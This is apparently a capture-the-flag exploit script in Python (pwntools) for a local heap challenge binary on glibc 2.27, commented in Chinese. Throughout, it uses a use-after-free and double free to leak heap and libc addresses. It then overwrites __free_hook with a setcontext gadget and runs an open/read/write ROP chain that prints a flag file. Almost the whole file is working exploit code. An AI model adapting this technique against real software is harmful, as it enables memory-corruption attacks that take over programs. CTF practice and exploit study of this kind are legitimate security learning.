#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF27')
libc = ELF('./libc-2.27.so')
elf = ELF('./UAF27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

add(0x70) #0 0x250
add(0x70) #1 0x2d0
add(0x70) #2

#填满tcachebin
for i in [1,0,1,0,1,0,1]:
	delete(i)

delete(1) #double free 放入 fastbin
show(0)
heapbase = u64(p.recv(6).ljust(8, "\x00")) - 0x2e0
pr('heapbase',heapbase)

edit(1, p64(heapbase +0x2d0))
add(0x70) #3 use chunk1
add(0x70) #4 fastbin 分配去 chunk1-0x10
edit(4, p64(0)+p64(0x101)) #修改chunk1 size = 0x100

add(0x60) #5 防止与top合并
#填满tcachebin
for i in range(7):
	delete(1)

delete(1) #unsortedbin chunk1 2 合并

show(1)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
setcontext_door = libcbase + libc.sym['setcontext'] + 53
free_hook = libcbase + libc.sym['__free_hook']
bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0xd2975 # syscall ; ret
prdx_ret = libcbase + 0x1306b4 # pop rdx ; pop r10 ; ret
prdi_ret = libcbase + 0x2155f  # pop rdi ; ret
prsi_ret = libcbase + 0x23e6a  # pop rsi ; ret
prax_ret = libcbase + 0x439c8  # pop rax ; ret
ret = prdi_ret + 1 # ret
pr('libcbase',libcbase)

edit(0, './flag\x00\x00')
flag_addr = heapbase + 0x260

#open
payload  = p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

#分割unsortedbin
add(0x68) #6 0x2d0
add(0x68) #7 0x340

delete(6) #tcachebin
edit(6, p64(free_hook))
add(0x68) #8 use chunk6
add(0x68) #9
edit(9, p64(setcontext_door))

add(0x10) #10 0x3b0
add(0x20) #11 0x440
##mov rsp, [rdi+0xa0],mov rcx, [rdi+0xa8],rsp->heapbase+0x2e0,rcx->ret
edit(11, p64(0)*2+p64(heapbase+0x2e0)+p64(ret)) 
edit(6, payload[:0x68])
edit(7, payload[0x68:])

#gdb.attach(p)
#pause()
delete(10)
p.interactive()